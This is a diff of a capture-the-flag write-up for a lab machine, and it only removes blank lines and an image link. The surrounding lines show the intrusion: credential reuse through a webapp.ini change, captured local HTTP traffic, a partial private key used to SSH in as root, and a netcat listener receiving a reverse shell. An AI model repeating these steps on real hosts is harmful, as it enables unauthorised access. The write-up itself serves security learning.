@@ -248,7 +248,6 @@ drwxrwxrwx          4,096 2021/04/10 16:03:08 .
 sent 20 bytes  received 379 bytes  114.00 bytes/sec
 total size is 193,430  speedup is 484.79
 
-
 The `rsync` command is a powerful file synchronization and transfer tool used in Unix-based systems. It is used to efficiently copy and synchronize files between different locations, whether they are local directories or remote systems accessible via SSH or rsync protocol.
 
 - `-a`: This option stands for "archive mode" and is used to preserve the file's metadata during the synchronization process, including permissions, timestamps, and symbolic links.
@@ -336,7 +335,6 @@ view-source:http://10.10.84.192/admin/
 
 so changing to dev instead of prod (also we have creds)
 
-
 here we have the ‘**webapp.ini**’ file which is used by the server in which we can specify the environment to ‘dev’ and sync the webapp.ini file with the server
 
 `webapp.ini` is a configuration file typically used in web applications. It contains settings and parameters that define how the web application behaves, interacts with databases, handles user sessions, and other important configurations.
@@ -421,7 +419,6 @@ Content-Length: 0
 Connection: close
 
 Content-Type: text/html; charset=UTF-8
-
 
 but ...
 
@@ -538,7 +535,6 @@ Host: 127.0.0.1:1027
 User-Agent: curl/7.58.0
 Accept: */*
 
-
 17:08:02.113540 IP localhost.1027 > localhost.44096: Flags [P.], seq 1:18, ack 116, win 1024, options [nop,nop,TS val 3056414541 ecr 3056414519], length 17
 E..E.R@.@..^...........@$....].b.....9.....
 .-/M.-/7HTTP/1.0 200 OK
@@ -552,7 +548,6 @@ E....S@.@..............@$....].b...........
 Content-Length: 1678
 Server: Werkzeug/1.0.1 Python/3.6.9
 Date: Sun, 23 Jul 2023 17:08:02 GMT
-
 
 17:08:02.114127 IP localhost.44096 > localhost.1027: Flags [.], ack 156, win 1022, options [nop,nop,TS val 3056414542 ecr 3056414542], length 0
 E..4..@.@.z..........@...].b$........(.....
@@ -593,7 +588,6 @@ QIaR6ed2y/NbuyJOIy7paSR+SlWT5G68FLaOmRzBqYdDOduhl061ww==
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ chmod 600 metamorfosis_rsa 
 
-
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ ssh -i metamorfosis_rsa root@10.10.84.192
 The authenticity of host '10.10.84.192 (10.10.84.192)' can't be established.
@@ -614,9 +608,7 @@ Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-144-generic x86_64)
   Memory usage: 87%               IP address for eth0: 10.10.84.192
   Swap usage:   0%
 
-
 0 updates can be applied immediately.
-
 
 Last login: Sat Apr 10 19:40:46 2021
 root@incognito:~# ls
@@ -907,10 +899,7 @@ listening on [any] 4444 ...
 connect to [10.8.19.103] from (UNKNOWN) [10.10.84.192] 56436
 www-data@incognito:/var/www/html$ :)
 
-
 ```
-
-![[Pasted image 20230723115224.png]]
 
 user.txt
 
